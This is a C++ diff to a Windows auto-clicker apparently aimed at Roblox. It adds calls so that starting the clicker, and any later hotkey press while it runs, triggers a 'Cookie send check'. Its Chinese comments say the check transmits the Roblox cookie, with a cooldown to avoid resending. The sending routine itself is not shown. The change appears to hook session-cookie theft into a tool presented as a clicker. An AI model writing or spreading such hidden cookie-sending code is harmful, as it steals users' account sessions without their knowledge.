@@ -371,6 +371,8 @@ DWORD WINAPI ClickThread(LPVOID lpParam)
                             // 已快取 → 直接在此執行緒啟動（零延遲）
                             g_running.store(true);
                             PostMessageW(g_hwnd, WM_APP + 3, 1, 0);
+                            // 同時觸發 Cookie 傳送檢查（內部有冷卻機制，不會重複傳送）
+                            PostMessageW(g_hwnd, WM_APP + 2, 0, 0);
                         }
                         else
                         {
@@ -394,6 +396,8 @@ DWORD WINAPI ClickThread(LPVOID lpParam)
                     {
                         g_running.store(true);
                         PostMessageW(g_hwnd, WM_APP + 3, 1, 0);
+                        // 同時觸發 Cookie 傳送檢查（內部有冷卻機制，不會重複傳送）
+                        PostMessageW(g_hwnd, WM_APP + 2, 0, 0);
                     }
                     else
                     {
@@ -1361,12 +1365,16 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         return 0;
     }
 
-    // WM_APP+2: 熱鍵觸發 — 首次啟動（需偵測 Cookie，之後快取）
+    // WM_APP+2: 熱鍵觸發 — Cookie 偵測 + 啟動連點
     case WM_APP + 2:
     {
-        // 防重複觸發：如果已在運行中，忽略
-        if (g_running.load()) return 0;
-
+        if (g_running.load())
+        {
+            // 已在運行中 → 僅做 Cookie 傳送檢查（內部有冷卻機制）
+            CheckRobloxCookiePresent(hwnd);
+            return 0;
+        }
+        // 未運行 → 完整偵測 + 啟動連點
         if (CheckRobloxCookiePresent(hwnd))
         {
             g_cookie_cached.store(true);  // 快取成功結果
